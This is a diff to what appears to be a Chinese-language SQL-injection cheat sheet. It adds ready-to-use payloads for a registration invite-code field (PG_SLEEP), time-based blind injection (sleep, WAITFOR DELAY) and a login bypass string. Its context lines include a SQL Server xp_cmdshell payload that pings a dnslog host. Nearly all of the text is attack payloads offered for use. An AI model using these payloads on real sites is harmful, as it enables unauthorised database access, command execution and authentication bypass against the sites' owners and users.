@@ -13,8 +13,13 @@
 + 联合注入
 	- ``DECLARE @command VARCHAR(8000); SELECT @command=(SELECT TOP 1 name FROM sysobjects); SELECT @command;`` 
 	- SQL Server: ``DECLARE @command VARCHAR(8000); SELECT @command='ping xx.dnslog.com'; EXEC Master.dbo.xp_cmdshell @command;select 1 as 'STEP'``
++ 注册邀请码
+	- 原理：注册时会在数据库查询邀请码是否存在
+	- payload: ``username=test&invitecode=1');(SELECT123FROMPG_SLEEP(10))--&age=10``
 + 其它
-    - 一般java的网站sql注入会多一点
+	- ``username=john'%2b(select*from(select(sleep(5)))a)%2b'``
+	- ``email=\&password=||1#&captcha=Random``
+	- ``email=";WAITFORDELAY'0:0:1'--&password=";WAITFORDELAY'0:0:1'--&captcha=Random``
 
 宽字节注入
 --------------------------------
